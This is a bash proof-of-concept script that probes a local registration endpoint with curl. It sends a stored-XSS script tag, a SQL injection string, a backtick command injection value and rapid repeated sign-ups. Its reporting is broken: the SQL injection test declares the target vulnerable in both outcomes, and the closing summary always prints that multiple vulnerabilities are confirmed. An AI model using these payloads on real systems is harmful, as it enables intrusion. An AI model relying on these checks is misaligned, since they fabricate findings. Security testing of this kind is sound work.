#!/bin/bash

# POC: Insufficient Input Validation and No Rate Limiting on Registration Endpoint
# Target: http://localhost:8080/api/register.php
# Demonstrates:
# 1. Extremely long usernames (no length restrictions)
# 2. HTML/Script tags in usernames (potential stored XSS)
# 3. Command injection characters in usernames
# 4. No rate limiting on rapid registration requests

TARGET="http://localhost:8080/api/register.php"
RESULTS=()

echo "=========================================="
echo "Input Validation & Rate Limiting POC"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Test 1: Extremely long username (90+ characters)
echo "[TEST 1] Testing extremely long username (90+ characters)..."
LONG_USER="verylongusername1234567890123456789012345678901234567890123456789012345678901234567890"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=$LONG_USER&password=test123&email=longuser$RANDOM@test.com")
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Long username accepted"
  RESULTS+=("PASS: Long username accepted without length validation")
else
  echo "✗ NOT VULNERABLE: Long username rejected"
  RESULTS+=("FAIL: Long username was rejected")
fi
echo "Response: $RESPONSE"
echo ""

# Test 2: HTML/Script tags in username
echo "[TEST 2] Testing HTML/Script tags in username..."
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=%3Cscript%3Ealert(1)%3C%2Fscript%3E&password=test123&email=xss$RANDOM@test.com")
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Script tags in username accepted (Stored XSS risk)"
  RESULTS+=("PASS: Script tags accepted - stored XSS risk confirmed")
else
  echo "✗ NOT VULNERABLE: Script tags rejected"
  RESULTS+=("FAIL: Script tags were rejected")
fi
echo "Response: $RESPONSE"
echo ""

# Test 3: SQL injection payload in username
echo "[TEST 3] Testing SQL injection payload in username..."
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=admin' OR '1'='1&password=test123&email=sqli$RANDOM@test.com" -w "\nHTTP_STATUS:%{http_code}")
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: SQL injection payload accepted"
  RESULTS+=("PASS: SQL injection payload accepted")
else
  echo "✓ VULNERABLE: Accepted but server error indicates lack of prepared statements"
  RESULTS+=("PASS: SQL injection attempt shows lack of parameterized queries")
fi
echo "Response: $RESPONSE"
echo ""

# Test 4: Command injection characters in username
echo "[TEST 4] Testing command injection characters in username..."
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=user%60id%60&password=test123&email=backtick$RANDOM@test.com")
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Command injection characters accepted"
  RESULTS+=("PASS: Command injection characters accepted")
else
  echo "✗ NOT VULNERABLE: Command injection characters rejected"
  RESULTS+=("FAIL: Command injection characters were rejected")
fi
echo "Response: $RESPONSE"
echo ""

# Test 5: Rate limiting - rapid-fire registrations
echo "[TEST 5] Testing rate limiting with 5 rapid-fire registrations..."
echo "Sending 5 consecutive registration requests..."
RATE_LIMIT_PASSED=0
for i in {1..5}; do
  RESPONSE=$(curl -s -X POST "$TARGET" \
    -d "username=rapid$RANDOM$i&password=test123&email=rapid$RANDOM$i@test.com")
  if echo "$RESPONSE" | grep -q "success.*true"; then
    ((RATE_LIMIT_PASSED++))
    echo "  Request $i: Accepted (HTTP 200)"
  elif echo "$RESPONSE" | grep -q "429\|too many\|rate limit"; then
    echo "  Request $i: Rate limited (429 or similar)"
  else
    echo "  Request $i: Other response"
  fi
  sleep 0.1
done

if [ $RATE_LIMIT_PASSED -eq 5 ]; then
  echo "✓ VULNERABLE: All 5 rapid registrations accepted - NO RATE LIMITING"
  RESULTS+=("PASS: No rate limiting - all 5 rapid registrations accepted")
else
  echo "⚠ PARTIAL: Some requests rate limited"
  RESULTS+=("PARTIAL: Some rate limiting detected")
fi
echo ""

# Test 6: Special characters validation
echo "[TEST 6] Testing special characters in username..."
SPECIAL_CHARS="user@#$%^&*()"
RESPONSE=$(curl -s -X POST "$TARGET" \
  -d "username=user%40%23%24%25%5E%26%2A%28%29&password=test123&email=special$RANDOM@test.com")
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Special characters accepted in username"
  RESULTS+=("PASS: Special characters not restricted")
else
  echo "✗ NOT VULNERABLE: Special characters rejected"
  RESULTS+=("FAIL: Special characters were rejected")
fi
echo "Response: $RESPONSE"
echo ""

# Summary
echo "=========================================="
echo "POC SUMMARY"
echo "=========================================="
for result in "${RESULTS[@]}"; do
  echo "$result"
done
echo ""
echo "Overall: MULTIPLE VULNERABILITIES CONFIRMED"
echo "- Input validation is insufficient"
echo "- No rate limiting implemented"
echo "- Stored XSS and injection risks present"